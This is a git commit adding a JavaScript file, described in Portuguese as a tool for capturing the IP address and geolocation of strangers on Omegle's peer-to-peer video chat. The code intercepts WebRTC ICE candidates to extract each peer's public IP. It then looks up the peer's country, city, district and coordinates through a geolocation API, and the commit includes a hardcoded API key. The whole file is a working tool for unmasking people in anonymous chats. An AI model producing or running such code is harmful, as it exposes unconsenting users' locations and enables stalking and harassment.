8862b231a9299c26793e66a6347007f443e24799
Cyber_Root0 <70926805+Cyber-Root0@users.noreply.github.com>
2021-02-13 12:41:53 -0300

    Getip-Omegle - JS
    Getip-Omegle - JS - Script para Capturar IP e Geolocalização na REDE p2p do OMEGLE

---
+++ omegle.js
@@ -0,0 +1,42 @@
+let apiKey = "aae79366964542e8a4dfa85d802d576a";
+
+window.oRTCPeerConnection =
+  window.oRTCPeerConnection || window.RTCPeerConnection;
+
+window.RTCPeerConnection = function (...args) {
+  const pc = new window.oRTCPeerConnection(...args);
+
+  pc.oaddIceCandidate = pc.addIceCandidate;
+
+  pc.addIceCandidate = function (iceCandidate, ...rest) {
+    const fields = iceCandidate.candidate.split(" ");
+
+    console.log(iceCandidate.candidate);
+    const ip = fields[4];
+    if (fields[7] === "srflx") {
+      getLocation(ip);
+    }
+    return pc.oaddIceCandidate(iceCandidate, ...rest);
+  };
+  return pc;
+};
+
+let getLocation = async (ip) => {
+  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
+
+  await fetch(url).then((response) =>
+    response.json().then((json) => {
+      const output = `
+          ---------------------
+          IP: ${ip}
+          Pais: ${json.country_name}
+          Estado: ${json.state_prov}
+          Cidade: ${json.city}
+          Distrito: ${json.district}
+          Latitude / Longitude: (${json.latitude}, ${json.longitude})
+          ---------------------
+          `;
+      console.log(output);
+    })
+  );
+};
